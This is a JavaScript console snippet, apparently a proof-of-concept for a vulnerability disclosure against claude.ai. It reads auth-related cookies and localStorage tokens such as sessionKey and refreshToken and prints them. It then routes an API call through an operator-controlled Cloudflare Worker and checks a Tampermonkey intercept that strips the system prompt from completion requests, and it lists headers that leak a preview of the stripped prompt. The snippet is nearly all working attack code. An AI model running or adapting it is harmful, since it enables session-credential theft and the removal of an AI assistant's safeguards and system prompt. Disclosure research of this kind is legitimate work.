// ================================================================
// DEVTOOLS SESSION BRIDGE & DIAGNOSTIC
// Sister PoC research artifact — Anthropic HackerOne VDP
// Single-operator. Paste into DevTools console on claude.ai.
//
// PURPOSE:
//   1. Extract real session credentials for Worker C diagnostics
//   2. Verify Worker C intercept is active and evidence headers present
//   3. Test system prompt stripping on a live completion call
//   4. Bridge session info to Worker A /bridge/session for logging
//
// CONFIGURE:
//   Set WORKER_C_URL below before pasting.
// ================================================================

(async function sisterPocDevtoolsBridge() {

  const WORKER_C_URL = 'https://CHANGE-ME.workers.dev'; // ← your Worker C

  if (WORKER_C_URL.includes('CHANGE-ME')) {
    console.error('[DevTools Bridge] Set WORKER_C_URL before running.');
    return;
  }

  console.group('[Sister PoC] DevTools Session Bridge & Diagnostic');
  console.log('Page origin:', window.location.origin);
  console.log('Worker C:',   WORKER_C_URL);

  // ── 1. Extract session credentials ────────────────────────────
  console.group('1. Session Credentials');

  const cookies = {};
  for (const pair of document.cookie.split(';')) {
    const [k, ...v] = pair.trim().split('=');
    if (k) cookies[decodeURIComponent(k.trim())] = decodeURIComponent(v.join('='));
  }

  const localStorage_ = {};
  const LS_KEYS = [
    '__cf_bm', '__cf_bm_tkn', 'sessionKey', 'session_key', 'auth_token',
    'access_token', 'refreshToken', 'orgId', 'accountId',
    'lastActiveOrgId', 'wb_worker_a_url', 'wb_config',
  ];
  for (const k of LS_KEYS) {
    const v = window.localStorage.getItem(k);
    if (v !== null) localStorage_[k] = v;
  }

  const authCookies = Object.fromEntries(
    Object.entries(cookies).filter(([k]) =>
      /session|token|auth|key|sid|claude|cf_/i.test(k)
    )
  );

  console.log('All cookies found:',         Object.keys(cookies).length);
  console.log('Auth-related cookies:',      Object.keys(authCookies));
  console.log('Relevant localStorage keys:', Object.keys(localStorage_).length);
  console.table(authCookies);
  if (Object.keys(localStorage_).length) console.table(localStorage_);
  console.groupEnd();

  // ── 2. Check Worker C health ──────────────────────────────────
  console.group('2. Worker C Health Check');
  try {
    const hResp = await fetch(`${WORKER_C_URL}/health`);
    const h     = await hResp.json();
    console.log('Worker C status:', h);
    console.log('Mode:', h.mode || 'unknown');
  } catch (e) {
    console.error('Worker C unreachable:', e.message);
  }
  console.groupEnd();

  // ── 3. Verify intercept on a real lightweight call ────────────
  // Makes a real call THROUGH Worker C to confirm headers & strip.
  // Uses /api/organizations (lightweight, no system prompt risk).
  console.group('3. Intercept Verification (lightweight API call)');
  try {
    const testUrl = new URL(window.location.href).origin + '/api/organizations';
    const workerTarget = WORKER_C_URL.replace(/\/$/, '') +
                         new URL(testUrl).pathname;

    const testResp = await fetch(workerTarget, {
      headers: {
        'x-original-url': testUrl,
        'x-tm-client-id': 'devtools-bridge',
      },
    });

    console.log('Response status:', testResp.status);
    console.log('x-wc-system-stripped:', testResp.headers.get('x-wc-system-stripped'));
    console.log('x-forwarded-by:',       testResp.headers.get('x-forwarded-by'));
    console.log('Worker C intercepted?', testResp.headers.get('x-forwarded-by') === 'worker-c' ? '✅ YES' : '❌ NO');
  } catch (e) {
    console.error('Intercept test failed:', e.message);
  }
  console.groupEnd();

  // ── 4. Tampermonkey status ─────────────────────────────────────
  console.group('4. Tampermonkey Status');
  if (window.__sisterPocTM) {
    const tm = window.__sisterPocTM;
    console.log('✅ Tampermonkey script active');
    console.log('  Version:',       tm.version);
    console.log('  Client ID:',     tm.clientId);
    console.log('  Worker C URL:',  tm.workerCUrl);
    console.log('  Intercepts:',    tm.interceptCount());
  } else {
    console.warn('❌ Tampermonkey NOT active on this page.');
    console.warn('   Install it via Tampermonkey dashboard and reload.');
  }
  console.groupEnd();

  // ── 5. Summary ────────────────────────────────────────────────
  console.group('5. VDP Evidence Summary');
  console.log('To generate system-prompt-strip evidence:');
  console.log('  1. Make sure Tampermonkey is installed & active (step 4 above)');
  console.log('  2. Send a message in claude.ai');
  console.log('  3. In Network tab, find the completion request');
  console.log('  4. Check response headers for x-wc-system-stripped: true');
  console.log('  5. Compare request body (no "system" field) vs normal body');
  console.log('');
  console.log('Worker C evidence headers to capture for VDP report:');
  console.log('  x-wc-system-stripped: true');
  console.log('  x-wc-system-length: <original char count>');
  console.log('  x-wc-system-preview: <first 80 chars of stripped system prompt>');
  console.groupEnd();

  console.groupEnd();

  return {
    cookies:       authCookies,
    localStorage:  localStorage_,
    workerCUrl:    WORKER_C_URL,
    tmActive:      !!window.__sisterPocTM,
  };

})();
